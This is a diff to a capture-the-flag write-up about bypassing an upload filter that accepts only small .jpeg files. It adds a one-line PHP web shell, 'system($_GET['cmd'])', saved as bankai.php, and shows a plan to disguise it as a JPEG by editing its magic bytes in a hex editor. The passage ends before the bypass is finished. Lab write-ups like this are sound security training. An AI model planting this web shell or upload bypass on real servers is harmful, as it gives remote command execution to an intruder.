@@ -110,7 +110,7 @@ oops, the file size supported is 39 bytes. So there's a filter in this upload fu
 
 1.Upload a .jpeg file 
 
-2.The maximum size of the .jpeg file must be 35 bytes
+2.The maximum size of the .jpeg file must be 39 bytes
 
 These are the 2 filters in the upload function
 
@@ -120,8 +120,23 @@ Reading this [blog](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-
 
 This is the method we'll be using
 
+payload:```AAAA<?php system($_GET[‘cmd’]); ?>```
 
+Save this in a file ```bankai.php```
 
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
+└─$ nano bankai.php 
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
+└─$ cat bankai.php 
+AAAA<?php system($_GET[‘cmd’]); ?>
+```
+Now, this is a php script, what we'll do is change the magic bytes header from a ```.php``` to a ```.jpeg```
+
+To access the magic bytes of the file, we'll use ```hexeditor```
+
+command:```hexeditor bankai.php```
 
 
 
